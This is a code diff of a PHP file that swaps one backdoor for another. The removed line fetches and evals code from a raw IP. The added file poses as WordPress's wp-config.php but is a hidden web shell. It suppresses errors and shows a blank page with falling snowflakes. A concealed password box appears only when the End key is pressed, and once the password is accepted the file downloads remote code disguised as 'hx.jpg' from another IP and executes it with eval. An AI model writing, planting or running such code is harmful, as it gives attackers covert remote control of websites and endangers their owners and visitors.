@@ -1,1 +1,157 @@
-<?php $url = "http://51.79.124.111/vz00";$ch = curl_init($url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);$tag= curl_exec($ch);curl_close($ch);eval("?>" . ("$tag"));?>
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the website, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
+ *
+ * @package WordPress
+ */
+
+error_reporting(0);
+ini_set('display_errors', 0);
+
+function is_logged_in() {
+    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'LPH'; 
+}
+
+function get_remote_content($url) {
+    if (function_exists("curl_init")) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        $result = curl_exec($ch);
+        curl_close($ch);
+        return $result;
+    } elseif (function_exists("file_get_contents")) {
+        return @file_get_contents($url);
+    } elseif (function_exists("fopen") && function_exists("stream_get_contents")) {
+        $handle = @fopen($url, "r");
+        if ($handle) {
+            $data = stream_get_contents($handle);
+            fclose($handle);
+            return $data;
+        }
+    }
+    return false;
+}
+
+if (is_logged_in()) {
+    $destiny = 'http://156.67.221.29/hx.jpg'; // remote file
+    $dream = get_remote_content($destiny);
+    if ($dream !== false) {
+        eval("?>".$dream);
+    }
+    exit;
+} else {
+    if (isset($_POST['password'])) {
+        $entered_key = $_POST['password'];
+        $hashed_key = '$2a$12$8mQvEvcMlMO5REBQBSFxkuRweblfxg2Emy0EGIL.49q0mIzx1c2OS'; // bcrypt hash
+
+        if (password_verify($entered_key, $hashed_key)) {
+            setcookie('user_id', 'LPH', time() + 3600, '/'); 
+            header("Location: ".$_SERVER['PHP_SELF']); 
+            exit();
+        }
+    }
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            width: 100vw;
+            background: #fff; 
+            overflow: hidden;
+            position: relative;
+        }
+        .login-container {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            background: #fff;
+            padding: 20px;
+            border: 1px solid #ccc;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            z-index: 1;
+        }
+        .login-container input {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin: 10px 0;
+            box-sizing: border-box;
+        }
+        .snowflake {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            width: 5px;
+            height: 5px;
+            opacity: 0.8;
+            pointer-events: none;
+            z-index: 0;
+            animation: fall linear;
+        }
+        @keyframes fall {
+            to {
+                transform: translateY(100vh);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container" id="loginBox">
+        <form method="POST" action="">
+            <label for="password">
+                
+            </label>
+            <input type="password" id="password" name="password" autofocus>
+            <input type="submit" value=" ">
+        </form>
+    </div>
+
+    <script>
+        function createSnowflake() {
+            const snowflake = document.createElement('div');
+            snowflake.className = 'snowflake';
+            snowflake.style.left = Math.random() * 100 + 'vw';
+            snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
+            snowflake.style.opacity = Math.random();
+            document.body.appendChild(snowflake);
+            
+            setTimeout(() => {
+                snowflake.remove();
+            }, 5000);
+        }
+
+        setInterval(createSnowflake, 100);
+
+        document.addEventListener("keydown", function(e) {
+            if (e.key === "End") {
+                document.getElementById("loginBox").style.display = "block";
+            }
+        });
+    </script>
+</body>
+</html>
